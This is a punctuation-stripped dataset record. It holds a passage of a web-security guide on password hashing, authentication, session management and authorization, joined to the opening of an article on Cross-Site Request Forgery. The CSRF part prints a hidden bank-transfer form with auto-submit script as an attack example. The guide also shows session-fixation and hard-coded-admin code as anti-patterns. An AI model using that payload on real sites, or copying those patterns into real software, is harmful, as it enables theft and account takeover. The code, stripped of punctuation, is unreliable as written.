recommending adoption  we ll update this evolving publication  In addition to choosing an appropriate algorithm  you want to make sure you have it configured correctly  Key derivation functions have configurable iteration counts  also known as work factor  so that as hardware gets faster  you can increase the time it takes to brute force them  OWASP provides recommendations on functions and configuration in their Password Storage Cheat Sheet  If you want to make your application a bit more future proof  you can add the configuration parameters in the password storage  too  along with the hash and salt  That way  if you decide to increase the work factor  you can do so without breaking existing users or having to do a migration in one shot  By including the name of the algorithm in storage  too  you could even support more than one at the same time allowing you to evolve away from algorithms as they are deprecated in favor of stronger ones  Once More with Hashing Really the only change to the code above is that rather than storing the password in clear text  you are storing the salt  the hash  and the work factor  That means when a user first chooses a password  you will want to generate a salt and hash the password with it  Then  during a login attempt  you will use the salt again to generate a hash to compare with the stored hash  As in  CREATE TABLE application_user   email_address VARCHAR 100  NOT NULL PRIMARY KEY  hash_and_salt VARCHAR 60  NOT NULL   def login conn  email  password   result   conn cursor   execute   SELECT hash_and_salt FROM application_user WHERE email_address        email   user   result fetchone   if user is not None  hashed   user 0  encode  utf 8   return is_hash_match password  hashed  return False def is_hash_match password  hash_and_salt   salt   hash_and_salt 0 29  return hash_and_salt    bcrypt hashpw password  salt  The example above uses the python bcrypt library  which stores the salt and the work factor in the hash for you  If you print out the results of hashpw     you can see them embedded in the string  Not all libraries work this way  Some output a raw hash  without salt and work factor  requiring you to store them in addition to the hash  But the result is the same  you use the salt with a work factor  derive the hash  and make sure it matches the one that was originally generated when the password was first created  Final Tips This might be obvious  but all the advice above is only for situations where you are storing passwords for a service that you control  If you are storing passwords on behalf of the user to access another system  your job is considerably more difficult  Your best bet is to just not do it since you have no choice but to store the password itself  rather than a hash  Ideally the third party will be able to support a much more appropriate mechanism like SAML  OAuth or a similar mechanism for this situation  If not  you need to think through very carefully how you store it  where you store it and who has access to it  It s a very complicated threat model  and hard to get right  Many sites create unreasonable limits on how long your password can be  Even if you hash and salt correctly  if your password length limit is too small  or the allowed character set too narrow  you substantially reduce the number of possible passwords and increase the probability that the password can be brute forced  The goal  in the end  is not length  but entropy  but since you can t effectively enforce how your users generate their passwords  the following would leave in pretty good stead  Minimum 12 alpha numeric and symbolic  1   A long maximum like 100 characters  OWASP recommends capping it at most 160 to avoid susceptibility to denial of service attacks resulting from passing in extremely long passwords  You ll have to decide if that s really a concern for your application  Provide your users with some kind of text recommending that  if at all possible  they  use a password manager randomly generate a long password  and don t reuse the password for another site  Don t prevent the user from pasting passwords into the password field  It makes many password managers unusable If your security requirements are very stringent then you may want to think beyond password strategy and look to mechanisms like two factor authentication so you aren t over reliant on passwords for security  Both NIST and Wikipedia have very detailed explanations of the effects of character length and set limits on entropy  If you are resources constrained  you can get quite specific about the cost of breaking into your systems based on speed of GPU clusters and keyspace  but for most of situations  this level of specificity just isn t necessary to find an appropriate password strategy  In Summary Hash and salt all passwords  Use an algorithm that is recognized as secure and sufficiently slow  Ideally  make your password storage mechanism configurable so it can evolve  Avoid storing passwords for external systems and services  Be careful not to set password size limits that are too small  or character set limits that are too narrow  Authenticate Users Safely If we need to know the identity of our users  for example to control who receives specific content  we need to provide some form of authentication  If we want to retain information about a user between requests once they have authenticated  we will also need to support session management  Despite being well known and supported by many full featured frameworks  these two concerns are implemented incorrectly often enough that they have earned spot  2 in the OWASP Top 10  Authentication is sometimes confused with authorization  Authentication confirms that a user is who they claim to be  For example  when you log into your bank  your bank can verify it is in fact you and not an attacker trying to steal the fortune you amassed selling your captioned cat pictures site  Authorization defines whether a user is allowed to do something  Your bank may use authorization to allow you to see your overdraft limit  but not allow you to change it  Session management ties authentication and authorization together  Session management makes it possible to relate requests made by a particular user  Without session management  users would have to authenticate during each request they sent to a web application  All three elements   authentication  authorization  and session management   apply to both human users and to services  Keeping these three separate in our software reduces complexity and therefore risk  There are many methods of performing authentication  Regardless of which method you choose  it is always wise to try to find an existing  mature framework that provides the capabilities you need  Such frameworks have often been scrutinized over a long period of time and avoid many common mistakes  Helpfully  they often come with other useful features as well  An overarching concern to consider from the start is how to ensure credentials remain private when a client sends them across the network  The easiest  and arguably only  way to achieve this is to follow our earlier advice to use HTTPS for everything  One option is to use the simple challenge response mechanism specified in the HTTP protocol for a client to authenticate to a server  When your browser encounters a 401  Unauthorized  response that includes information about a challenge to access the resource  it will popup a window prompting you to enter your name and password  keeping them in memory for subsequent requests  This mechanism has some weaknesses  the most serious of which being that the only way for a user to logout is by closing their browser  A safer option that allows you to manage the lifecycle of a user s session after authenticating is by simply entering credentials through a web form  This can be as simple as looking up a username in a database table and comparing the hash of a password using an approach we outlined in our earlier section on hashing passwords  For example  using Devise  a popular framework for Ruby on Rails  this can be done by registering a module for password authentication in the model used to represent a User  and instructing the framework to authenticate users before requests are processed by controllers    Register Devise s database_authenticatable module in our User model to   handle password authentication using bcrypt  We can optionally tune the work   factor with the  stretches  option  class User   ActiveRecord  Base devise  database_authenticatable end   Superclass to inherit from in controllers that require authentication class AuthenticatedController   ApplicationController before_action  authenticate_user  end Understand Your Options Although authenticating using a username and a password works well for many systems  it isn t our only option  We can rely on external service providers where users may already have accounts to identify them  We can also authenticate users using a variety of different factors  something you know  such as a password or a PIN  something you have  such as your mobile phone or a key fob  and something you are  such as your fingerprints  Depending on your needs  some of these options may be worth considering  while others are helpful when we want to add an extra layer of protection  One option that offers a convenience for many users is to allow them to log in using their existing account on popular services such as Facebook  Google  and Twitter  using a service called Single Sign On  SSO   SSO allows users to log in to different systems using a single identity managed by an identity provider  For example  when visiting a website you may see a button that says  Sign in with Twitter  as an authentication option  To achieve this  SSO relies on the external service to manage logging the user in and to confirm their identity  The user never provides any credentials to our site  SSO can significantly reduce the amount of time it takes to sign up for a site and eliminates the need for users to remember yet another username and password  However  some users may prefer to keep their use of our site private and not connect it to their identity elsewhere  Others may not have an existing account with the external providers we support  It is always preferable to allow users to register by manually entering their information as well  A single factor of authentication such as a username and password is sometimes not enough to keep users safe  Using other factors of authentication can add an additional layer of security to protect users in the event a password is compromised  With Two Factor Authentication  2FA   a second  different factor of authentication is required to confirm the identity of a user  If something the user knows  such as a username and password  is used as the first factor of authentication  a second factor could be something the user has  such as a secret code generated using software on their mobile phone or by a hardware token  Verifying a secret code sent to a user via SMS text message was once a popular way of doing this  but it is now deprecated due to presenting various risks  Applications like Google Authenticator and a multitude of other products and services can be safer and are relatively easy to implement  although any option will increase complexity of an application and should be considered mainly when applications maintain sensitive data  Reauthenticate For Important Actions Authentication isn t only important when logging in  We can also use it to provide additional protection when users perform sensitive actions such as changing their password or transferring money  This can help limit the exposure in the event a user s account is compromised  For example  some online merchants require you to re enter details from your credit card when making a purchase to a newly added shipping address  It is also helpful to require users to re enter their passwords when updating their personal information  Conceal Whether Users Exist When a user makes a mistake entering their username or password  we might see a website respond with a message like this  The user ID is unknown  Revealing whether a user exists can help an attacker enumerate accounts on our system to mount further attacks against them or  depending on the nature of the site  revealing the user has an account may compromise their privacy  A better  more generic  response might be  Incorrect user ID or password  This advice doesn t just apply when logging in  Users can be enumerated through many other functions of a web application  for example when signing up for an account or resetting their password  It is good to be mindful of this risk and avoid disclosing unnecessary information  One alternative is to send an email with a link to continue their registration or a password reset link to a user after they enter their email address  instead of outputting a message indicating whether the account exists  Preventing Brute Force Attacks An attacker might try to conduct a brute force attack to guess account passwords until they find one that works  With attackers increasingly using large networks of compromised systems referred to as botnets to conduct attacks with  finding an effective solution to protect against this while not impacting service continuity is a challenging task  There are many options we can consider  some of which we ll discuss below  As with most security decisions  each provides benefits but also comes with tradeoffs  A good starting point that will slow an attacker down is to lock users out temporarily after a number of failed login attempts  This can help reduce the risk of an account being compromised  but it can also have the unintended effect of allowing an attacker to cause a denial of service condition by abusing it to lock users out  If the lockout requires an administrator to unlock accounts manually  it can cause a serious disruption to service  In addition  account lockout could be used by an attacker to determine whether accounts exist  Still  this will make things difficult for an attacker and will deter many  Using short lockouts of between 10 to 60 seconds can be an effective deterrent without imposing the same availability risks  Another popular option is to use CAPTCHAs  which attempt to deter automated attacks by presenting a challenge that a human can solve but a computer can not  Oftentimes it seems as though they present challenges that can be solved by neither  These can be part of an effective strategy  but they have become decreasingly effective and face criticisms  Advancements have made it possible for computers to solve challenges with greater accuracy  and it has become inexpensive to hire human labor to solve them  They can also present problems for people with vision and hearing impairments  which is an important consideration if we want our site to be accessible  Layering these options has been used as an effective strategy on sites that see frequent brute force attacks  After two login failures occur for an account  a CAPTCHA might be presented to the user  After several more failures  the account might be locked out temporarily  If that sequence of failures repeats again  it might make sense to lock the account once again  this time sending an email to the account owner requiring them to unlock the account using a secret link  Don t Use Default Or Hard Coded Credentials Shipping software with default credentials that are easy to guess presents a major risk for users and applications alike  It may seem like it is providing a convenience for users  but in reality this couldn t be further from the truth  It is common to see this in embedded systems such as routers and IoT devices  which can immediately become easy targets once connected to networks  Better options might be requiring users to enter unique one time passwords and then forcing the user to change it  or preventing the software from being accessed externally until a password is set  Sometimes hard coded credentials are added to applications for development and debugging purposes  This presents risks for the same reasons and might be forgotten about before the software ships  Worse  it may not be possible for the user to change or disable the credentials  We must never hard code credentials in our software  In Frameworks Most web application frameworks include authentication implementations that support a variety of authentication schemes  and there are many other third party frameworks to choose from as well  As we stated earlier  it is preferable to try to find an existing  mature framework that suits your needs  Below are some examples to get you started  Framework Approaches Java Apache Shiro OACC Spring Spring Security Ruby on Rails Devise ASP NET ASP NET Core authentication Built in Authentication Providers Play play silhouette Node js Passport framework In Summary Use existing authentication frameworks whenever possible instead of creating one yourself  Support authentication methods that make sense for your needs  Limit the ability of an attacker to take control of an account  You can take steps to prevent attacks to identify or compromise accounts  Never use default or hard coded credentials  Protect User Sessions As a stateless protocol HTTP offers no built in mechanism for relating user data across requests  Session management is commonly used for this purpose  both for anonymous users and for users who have authenticated  As we mentioned earlier  session management can apply both to human users and to services  Sessions are an attractive target for attackers  If an attacker can break session management to hijack authenticated sessions  they can effectively bypass authentication entirely  To make matters worse  it is fairly common to see session management implemented in a way that makes it easier for sessions to fall into the wrong hands  So what can we do to get it right  As with authentication  it is preferable to use an existing  mature framework to handle session management for you and tune it for your needs rather than trying to implement it yourself from scratch  To give you some idea of why it is important to use an existing framework so you can focus on using it for your needs  we ll discuss some common problems in session management  which fall into two categories  weaknesses in session identifier generation  and weaknesses in the session lifecycle  Generate Safe Session Identifiers Sessions are typically created by setting a session identifier inside a cookie that will be sent by a user s browser in subsequent requests  The security of these identifiers depend on them being unpredictable  unique  and confidential  If an attacker can obtain a session identifier by guessing it or observing it  they can use it to hijack a user s session  The security of identifiers can be easy to undermine by using predictable values  which is fairly common to see in custom implementations  For example  we might see a cookie of the form  Set Cookie  sessionId NzU4NjUtMTQ2Nzg3NTIyNzA1MjkxMg What happens if an attacker logs in several additional times and observes the following sequence for the sessionId cookie  NzU4ODQtMTQ2Nzg3NTIyOTg0NTE4Ng NzU4OTItMTQ2Nzg3NTIzNTQwODEzOQ An attacker might recognize that the sessionId is base64 encoded and decode it to observe its values  75865 1467875227052912 75884 1467875229845186 75892 1467875235408139 It doesn t take much guesswork to realize the token is comprised of two values  what is most likely a sequence number  and the current time in microseconds  An identifier of this type would take little effort for an attacker to guess and hijack sessions  Although this is a basic example  other generation schemes don t always offer much more in the way of protection  Attackers can make use of freely available statistical analysis tools to improve the chances of guessing more complex tokens  Using predictable inputs such as the current time or a user s IP address to derive a token are not enough for this purpose  So how can we generate a session identifier safely  To greatly reduce the chances of an attacker guessing a token  OWASP s Session Management Cheat Sheet recommends using a session identifier that is a minimum of 128 bits  16 bytes  in length generated using a secure pseudorandom number generator  For example  both Java and Ruby have classes named SecureRandom that obtain pseudorandom numbers from sources such as  dev urandom  Instead of using an identifier that will be used to look up information about a user  some session management implementations put information about the user inside of the cookie itself to eliminate the cost of performing a lookup in a data store  Unless done carefully using cryptographic algorithms to ensure the confidentiality  integrity  and authenticity of the data  this can lead to even more problems  The decision to store any information about a user inside of a cookie is a subject of controversy and should not be taken lightly  As a principle  limit the information sent inside the cookie to what is absolutely necessary  Never store personally identifiable information about the user or secret information  even when you re using encryption  If the information includes things like the user s username or their role and privilege levels  you must protect against the risk of an attacker tampering with the data to bypass authorization or hijack another user s account  If you choose to store this type of information inside of cookies  look for an existing framework that mitigates these risks and has withstood scrutiny by experts  Don t Expose Session Identifiers Using HTTPS will help prevent someone from eavesdropping on network traffic to steal session identifiers  but they are sometimes leaked unintentionally in other ways  In a classic example  an airline customer sends a link to search results on the airline s website to a friend  The link contains a parameter with the customer s session identifier  and the friend is suddenly able to book flights as the customer  Needless to say  exposing the session identifier in the URL is risky  It might get unwittingly sent to a third party like in the above example  exposed in the Referer header if the user clicks a link to an external website  or logged in the site s logs  Cookies are a better choice for this purpose since they don t risk exposure in this way  It is also common to see session identifiers sent in custom HTTP headers and even in body arguments of POST requests  No matter what you choose to do  make sure the session identifier should not be exposed in URLs  logs  referrer  or anywhere they could be accessed by an attacker  Protect Your Cookies When cookies are used for sessions  we should take some simple precautions to make sure they are not unintentionally exposed  There are four attributes that are important to understand for this purpose  Domain  Path  HttpOnly  and Secure  Domain restricts the scope of a cookie to a particular domain and its subdomains  and Path further restricts the scope to a path and its subpaths  Both attributes are set to fairly restrictive values by default when not explicitly set  The default for Domain will only permit a cookie to be sent to the originating domain and its subdomains  and the default for Path will restrict a cookie to the path of the resource where the cookie was set and its subpaths  Setting the Domain to a less restrictive value can be risky  Imagine if we were to set the Domain to martinfowler com when visiting payments martinfowler com to pay for a new book subscription service  This would result in the cookie being sent to martinfowler com and any of its subdomains on subsequent requests  Aside from it potentially being unnecessary to send the cookie to all subdomains  if we don t control every subdomain and their security  for example  are they using HTTPS    it might help an attacker to capture cookies  What would happen if our user visited evil martinfowler com  The Path attribute should also be set as restrictive as possible  If the session identifier is only needed when accessing the  secret  path and its subpaths after logging in at  login  it is a good idea to set it to  secret   The other two attributes  Secure and HttpOnly  control how the cookie is used  The Secure flag indicates that the browser should only send the cookie when using HTTPS  The HttpOnly flag instructs the browser that the cookie should not be accessible through JavaScript or other client side scripts  which helps prevent it being stolen by malicious code  Putting it together  our cookie might look like this  Set Cookie  sessionId  top secret value   path  secret   secure  HttpOnly  domain payments martinfowler com The net effect of the above statement would be a cookie with client script access disabled that is only available to requests to the paths below https   payments martinfowler com secret   By restricting the scope of the cookie  the attack surface becomes much smaller  Managing the Session Lifecycle Properly managing the lifecycle of a session will reduce the risk of it becoming compromised  How you manage sessions depends on your needs  As an example  a bank probably has a very different session lifecycle than our site for captioned cat pictures  We may choose to begin a session during the first request a user makes to our site  or we may decide to wait until the user authenticates  Whatever you choose to do  there is a risk when changing the privilege level of a session  What would happen if an attacker is able to set the session identifier for a user to a less privileged session known to the attacker  for example in a cookie or in a hidden form field  If the attacker is able to trick the user into logging in  they are suddenly in control of a more privileged session  This is an attack called session fixation  There are two things we can do to avoid having our users falling into this trap  First  we should always create a new session when a user authenticates or elevates their privilege level  Second  we should only create session identifiers ourselves and ignore identifiers that aren t valid  We would never want to do this     pseudocode  NEVER DO THIS if   isValid sessionId     session   createSession sessionId     The longer a session is active  the greater the chance an attacker might be able to get their hands on it  To reduce that risk and keep our session table clean  we can impose timeouts on sessions that are left inactive for some amount of time  The duration of time depends on your risk tolerance  On our captioned cat pictures site  it might only be necessary to do this after a month or even longer  A bank  on the other hand  might have a strict policy of timing out sessions after 10 minutes of inactivity as a security precaution  Our users might not be using a computer they exclusively have access to  or they might prefer to not leave their session logged in  Always make sure there is a visible and easy way to log out  When a user does log out  we must instruct the browser to destroy their session cookie by indicating that it expired at a date in the past  For example  based the cookie we set earlier  Set Cookie  sessionId  top secret value   path  secret   secure  HttpOnly  domain payments martinfowler com  expires Thu  01 Jan 1970 00 00 00 GMT One final consideration is providing some way for users to terminate their active sessions in the event they accidentally forgot to logout of a system they don t own or even suspect their account has been compromised  One easy way to deal with this is to terminate all sessions for a user when they change their password  It is also helpful to provide the ability for a user to view a list of their active sessions to help them identify when they are at risk  Verify It There are a lot of different considerations involved in authentication and session management  To make sure we haven t made any mistakes  it is helpful to look at OWASP s ASVS  Application Security Verification Standard   which is an invaluable resource when making sure there are no gaps in requirements or in our implementation  The standard has an entire section on authentication and another on session management  ASVS suggests security based on three levels of needs  1  which will help defend against some basic vulnerabilities  2  which is suitable for an ordinary site that maintains some sensitive data  and 3  which we might see in highly sensitive applications such as for health care or financial services  Most of the security precautions we describe will fit in with level 2  In Frameworks We have outlined only some of the risks that arise in session identifier generation and session lifecycle management  Fortunately  session management is built into most web application frameworks and even some server implementations  providing a number of mature options to use rather than risk implementing it yourself  Framework Approaches Java Tomcat Jetty Apache Shiro OACC Spring Spring Security Ruby on Rails Ruby on Rails Devise ASP NET ASP NET Core authentication Built in Authentication Providers Play play silhouette Node js Passport framework In Summary Use existing session management frameworks instead of creating your own  Keep session identifiers secret  do not use them in URLs or logs  Protect session cookies using attributes to restrict their scope  Create a new session when one doesn t exist or whenever a user changes their privilege level  Never create sessions with ids you haven t created yourself  Make sure users have a way to log out and to terminate their existing sessions  Authorize Actions We discussed how authentication establishes the identity of a user or system  sometimes referred to as a principal or actor   Until that identity is used to assess whether an operation should be permitted or denied  it doesn t provide much value  This process of enforcing what is and is not permitted is authorization  Authorization is generally expressed as permission to take a particular action against a particular resource  where a resource is a page  a file on the files system  a REST resource  or even the entire system  Authorize on the Server Among the most critical mistakes a programmer can make is hiding capabilities rather than explicitly enforcing authorization on the server  For example  it is not sufficient to simply hide the  delete user  button from users that are not administrators  The request coming from the user cannot be trusted  so the server code must perform the authorization of the delete  Further  the client should never pass authorization information to the server  Rather the client should only be allowed to pass temporary identity information  such as session ids  that have been previously generated on the server  and are unguessable  see above for session management practices   Again  the server should not trust anything from the client as far as identity  permissions  or roles  that it cannot explicitly validate  Deny by Default Earlier in this article we talked about the value of positive validation  or whitelisting   The same principle applies with authorization  Your authorization mechanism should always deny actions by default unless they are explicitly allowed  Similarly  if you have some actions that require authorization and others that do not  it is much safer to deny by default and override any actions that don t require a permission  In both cases  providing a safe default limits the damage that can occur if you neglect to specify the permissions for a particular action  Authorize Actions on Resources Generally speaking  you will encounter two different kinds of authorization requirements  global permissions and resource level permissions  You can think of global permission as having an implicit system resource  However  implementation details between a global and resource permissions tend to be different  as demonstrated in the following examples  Because the resource of global permission is implicit  or  if you prefer  non existent  the implementation tends to be straightforward  For example  if I wanted to add a permission check to shutdown my server  I could do the following  public OperationResult shutdown final User callingUser    if  callingUser    null    callingUser hasPermission Permission SHUTDOWN     doShutdown    return SUCCESS    else   return PERMISSION_DENIED      An alternative implementation using Spring Security s declarative capability might look like this   PreAuthorize  hasRole  ROLE_SHUTDOWN     public void shutdown   throws AccessDeniedException   doShutdown      Resource authorization is generally more complex because it validates whether an actor can take a particular action against a particular resource  For example a user should be able to modify their own profile and only their own profile  Again  our system MUST validate that the caller is entitled to take the action on the specific resource being affected  The rules that govern resource authorization are domain specific and can be fairly complicated both to implement and maintain  Existing frameworks may provide assistance  but you will need to make sure the one you use is sufficiently expressive to capture the complexity you require without being too complicated to maintain  An example might look like this  public OperationResult updateProfile final UserId profileToUpdateId  final ProfileData newProfileData  final User callingUser    if  isCallerProfileOwner profileToUpdateId  callingUser     doUpdateProfile profileToUpdateId  newProfileData   return SUCCESS    else   return PERMISSION_DENIED      private boolean isCallerProfileOwner final UserId profileToUpdateId  final User callingUser      Make sure the user is trying to update their own profile return profileToUpdateId equals callingUser getUserId       Or declaratively  using Spring Security again   PreAuthorize  hasPermission  updateUserId   owns     public void updateProfile final UserId updateUserId  final ProfileData profileData  final User callingUser  throws AccessDeniedException   doUpdateProfile updateUserId  profileData     Use Policy to Authorize Behavior Fundamentally  the entire process from identification through execution of an action could be summarized as follows  An anonymous actor becomes a known principal through authentication  Policy determines whether an action can be taken by that principal against a resource    determines whether an can be taken by that principal against a   Assuming the policy allows the action  the action is executed  A policy contains the logic that answers the question of whether an action is or is not allowed  but the way it makes that assessments varies broadly based on the needs of the application  Although we are unable to cover them all  the following section will summarize some of the more common approaches to authorization and provide some idea of when each is best applied  Implementing RBAC Probably the most common variant of authorization is role based access control  RBAC   As the name implies  users are assigned roles and roles are assigned permissions  Users inherit the permission for any roles they have been assigned  Actions are validated for permissions  Perhaps you re wondering about the value of all this indirection  all you care about is that Kristen  your administrator  is able to delete users  and other users cannot  Why not just check for Kristen s username  as in the following code  public OperationResult deleteUser final UserId userId  final User callingUser    if  callingUser    null    callingUser getUsername   equals  admin_kristen      doDelete userId   return SUCCESS    else   return PERMISSION_DENIED      What happens when user  admin_kristen  leaves your organization or changes to another role  You either have to share her credentials  which is  of course  a very bad idea  or go through the code changing all references to  admin_kristen  to the new user  A very common alternative to this is to check for the role  as in this case  public OperationResult deleteUser final UserId userId  final User callingUser    if  callingUser    null    callingUser hasRole Role ADMIN     doDelete userId   return SUCCESS    else   return PERMISSION_DENIED      Better  but not great  We haven t tied identity to the action  but we still have a problem if we find that there are admins with lesser privileges that are allowed to add users  but not delete users  Suddenly our  admin  role isn t granular enough and we re forced to find all the  admin  checks  and  if appropriate  put an OR operation for operations allowed by both admins and our new user_creator role  As the system evolves  you end up with more and more complicated statements and an explosion in the number of roles  Users and roles will change as our software evolves  and so our solution should reflect that  Instead of hard coding user names or even role names  we ll be best served in the long term if our code validates that a particular action is allowed  This code shouldn t be concerned with who the user is  or even what roles they may or may not have  but rather whether they have the permission to do something  The mapping of identity to permission can be done upstream  public OperationResult deleteUser final UserId userId  final User callingUser    if  callingUser    null    callingUser hasPermission Permission DELETE_USER     doDelete userId   return SUCCESS    else   return PERMISSION_DENIED      Our structure is much better now because we ve made the choice to explicitly decouple permissions from roles  Yes  there is some complexity that comes with the extra step needed to map users to permissions  but generally speaking you can take advantage of frameworks like Spring Security or CanCanCan to do the heavy lifting  Consider RBAC when  Permissions are relatively static  Roles in your policies actually map reasonably to roles within your domain  rather than feeling like contrived aggregations of permissions  There isn t a terribly large number of permutations of permission  and therefore roles that will have to be maintained  You have no compelling reason to use one of the other options  Implementing ABAC If your application has more advanced needs than you can reasonably implement with RBAC  you may want to look at attribute based access control  ABAC   Attribute based access control can be thought of as a generalization of RBAC that extends to any attribute of the user  the environment in which the user exists  or the resource being accessed  With ABAC  instead of making access control decisions based on just whether the user has a role assigned  the logic can come from any property of the user s profile such as their position as defined by HR  the amount of time they have worked at the company  or the the country of their IP address  In addition  ABAC can draw on global attributes like the time of day or whether it s a national holiday in the user s locale  The most common standarized means of expressing ABAC policy is XACML  an XML based format from Oasis  This example demonstrates how one might write a rule that allows users to read if they are in a particular department at a particular time of day   Policy PolicyId  ExamplePolicy  RuleCombiningAlgId  urn oasis names tc xacml 1 0 rule combining algorithm permit overrides    Target   Subjects   AnySubject     Subjects   Resources   Resource   ResourceMatch MatchId  urn oasis names tc xacml 1 0 function anyURI equal    AttributeValue DataType  http   www w3 org 2001 XMLSchema anyURI  http   example com resources 1  AttributeValue   ResourceAttributeDesignator DataType  http   www w3 org 2001 XMLSchema anyURI  AttributeId  urn oasis names tc xacml 1 0 resource resource id       ResourceMatch    Resource    Resources   Actions   AnyAction      Actions    Target   Rule RuleId  ReadRule  Effect  Permit    Target   Subjects   AnySubject     Subjects   Resources   AnyResource     Resources   Actions   Action   ActionMatch MatchId  urn oasis names tc xacml 1 0 function string equal    AttributeValue DataType  http   www w3 org 2001 XMLSchema string  read  AttributeValue   ActionAttributeDesignator DataType  http   www w3 org 2001 XMLSchema string  AttributeId  urn oasis names tc xacml 1 0 action action id      ActionMatch    Action    Actions    Target   Condition FunctionId  urn oasis names tc xacml 1 0 function and    Apply FunctionId  urn oasis names tc xacml 1 0 function string equal    Apply FunctionId  urn oasis names tc xacml 1 0 function string one and only    SubjectAttributeDesignator DataType  http   www w3 org 2001 XMLSchema string  AttributeId  department      Apply   AttributeValue DataType  http   www w3 org 2001 XMLSchema string  development  AttributeValue    Apply   Apply FunctionId  urn oasis names tc xacml 1 0 function and    Apply FunctionId  urn oasis names tc xacml 1 0 function time greater than or equal    Apply FunctionId  urn oasis names tc xacml 1 0 function time one and only    EnvironmentAttributeSelector DataType  http   www w3 org 2001 XMLSchema time  AttributeId  urn oasis names tc xacml 1 0 environment current time      Apply   AttributeValue DataType  http   www w3 org 2001 XMLSchema time  09 00 00  AttributeValue    Apply   Apply FunctionId  urn oasis names tc xacml 1 0 function time less than or equal    Apply FunctionId  urn oasis names tc xacml 1 0 function time one and only    EnvironmentAttributeSelector DataType  http   www w3 org 2001 XMLSchema time  AttributeId  urn oasis names tc xacml 1 0 environment current time       Apply   AttributeValue DataType  http   www w3 org 2001 XMLSchema time  17 00 00  AttributeValue    Apply    Apply    Condition    Rule   Rule RuleId  Deny  Effect  Deny      Policy  It s worth mentioning that XACML has its challenges  It is certainly verbose and arguably cryptic  It s also one of the few options you have if you want to use a standardized model for defining ABAC policies  Another option is to build policies in the language of your application  bound to its domain  Below is an example of the same policy written in JavaScript declarative style supported by a small DSL  allow  read    of anyResource     if and  User department   is equalTo  development     timeOfDay   isDuring  9 00 PST    17 00 PST       There s considerable work to do here in addition to the defining of the policy itself that is beyond the scope of this article  To get a flavor for how something like this might be implemented  you can take a look at the repository for the DSL implementation that supports the example policy  Should you choose the path of using custom code  you will need to think about how much investment you are willing to make in the DSL itself and who owns the implementation  If you expect to have a large number of highly dynamic policies  a more sophisticated DSL might be worthwhile  An external DSL might be justified for cases in which non programmers need to understand the policies  Otherwise  for cases of more limited scope and static policies  it s best to start simple with the goal of making the policies clear to their primary maintainers  the programmers  and letting the DSL evolve over the lifecycle of the project  always taking care that changes to the DSL do not break existing policy implementations  Creating in a DSL is not a must  You can use the same object oriented  functional  or procedural coding style the rest of your application uses  and rely on strong design and refactoring practices to create clean code  The repo also includes an example with the same rules using a imperative  rather than declarative  approach  Consider ABAC when  Permissions are highly dynamic and simply changing user roles is going to be a significant maintenance headache  The profile attributes on which permissions depend are already maintained for other purposes  such as managing an employee s HR profile  Access control is sufficiently sensitive that control flows need to vary based on temporal attributes such as whether it s during the normal working hours of your employees  You wish to have centralized policy with very fine grained permissions  managed independently of your application code  Other Ways to Model Policy The above are just two possible ways of modeling policy and will probably accommodate most situations  Although they are probably rare  situations do arise that don t fit well into RBAC or ABAC  Other approaches include  Mandatory access control  MAC   centrally managed non overridable policy based on subject and resource security attributes  such as Linux  LSM  Relationship based Access Control  ReBAC   policy that is largely determined by relationship between principals and resources  Discretionary Access Control  DAC   policy approach that includes owner managed permission control  as well as systems with transferable tokens of authority  Rule based Access Control  dynamic role or permission assignment based on a set of operator programmed rules There is not universal agreement on when these approaches apply or even exactly how to define them  There is substantial overlap in the types of policies they allow operators to define  Before going down the path of choose a more esoteric approach  or inventing your own  be sure that RBAC or ABAC aren t reasonable approaches to modeling your policies  Implementation Considerations Finally  here are a few words of advice to consider when implementing authorization in your application  Browser caches can really mess with your authorization model when users share browsers  Make sure that you set the Cache Control header to  private  no cache  no store  for resources so that your server side authorization code is called every time   You will inevitably have to make a decision whether to use a declarative or imperative approach to validation logic  There is no right or wrong here  but you will want to consider what provides the most clarity  Declarative mechanisms like the annotations that Spring Security provides can be concise and elegant  but if the authorization flow is complicated  the built in expression language becomes convoluted and  arguably  you re better off writing well factored code   Try to find a solution  whether custom or framework based  that consolidates and reduces duplication of authorization logic  If you find your authorization code is scattered arbitrarily throughout your codebase  you are going to have a very hard time maintaining it  and that leads to security bugs  In Summary Authorization must always be checked on the server  Hiding user interface components is fine for user experience  but not an adequate security measure  Deny by default  Positive validation is safer and less error prone than negative validation  Code should authorize against specific resources such as files  profiles  or REST endpoints  Authorization is domain specific  but there are some common patterns to consider when designing your permission model  Stick to common patterns and frameworks unless you have a very compelling reason not to  Use RBAC for basic cases and keep permissions and roles decoupled to allow your policies to evolve  For more complicated scenarios  consider ABAC  and use XACML or policies coded in the application s language  This article is an Evolving Publication  Our intention is to continue to describe basic techniques that developers could  and should  use to reduce the chances of a security breach  To find out when we expand the article  follow the site s RSS feed or Martin s twitter feed  We ll also announce updates on our twitter feeds  Cade Cairns and Daniel Somerfield,"[400 629 28 45 444 1395 1001 329 454 1267 248]"
45,training-dataset/engineering/883.txt,engineering,Cross Site Request Forgery is dead Cross Site Request Forgery is dead   After toiling with Cross Site Request Forgery on the web for  well forever really  we finally have a proper solution  No technical burden on the site owner  no difficult implementation  it s trivially simple to deploy  it s Same Site Cookies       As old as the Web itself  Cross Site Request Forgery  also known as CSRF or XSRF  has been around basically forever  It stems from the simple capability that a site has to issue a request to another site  Let s say I embed the following form in this very page    form action  https   your bank com transfer  method  POST  id  stealMoney    input type  hidden  name  to  value  Scott Helme    input type  hidden  name  account  value  14278935    input type  hidden  name  amount  value   1 000        Your browser loads this page and as a result the above form which I then submit using a simple piece of JS on my page too   document getElementById  stealMoney   submit         This is where the name CSRF comes from  I m Forging a Request that is being sent Cross Site to your bank  The real problem here is not that I sent the request but that your browser will send your cookies with it  The request will be sent with the full authority you currently hold at this time  which means if you re logged in to your bank you just donated  1 000 to me  Thanks  If you weren t logged in then the request would be harmless as you can t transfer money without being logged in  There are currently a few ways that your bank can mitigate these CSRF attacks       CSRF mitigations  I won t detail these too much because there are heaps of info available about this topic on the web but I want to quickly cover them to show the technical requirements to implement them       Check the origin  When receiving a request we potentially have two pieces of information available to us that indicate where the request came from  These are the Origin header and the Referer header  You can check one or both of these values to see if the request originated from a different origin to your own  If the request was cross origin you simply throw it away  The Origin and Referer header do get some protection from browsers to prevent tampering but they may not always be present either   accept  text html application xhtml xml application xml q 0 9 image webp     q 0 8 accept encoding  gzip  deflate  br cache control  max age 0 content length  166 content type  application x www form urlencoded dnt  1 origin  https   report uri io referer  https   report uri io login upgrade insecure requests  1 user agent  Mozilla 5 0  Windows NT 10 0  WOW64  AppleWebKit 537 36  KHTML  like Gecko  Chrome 56 0 2924 87 Safari 537 36      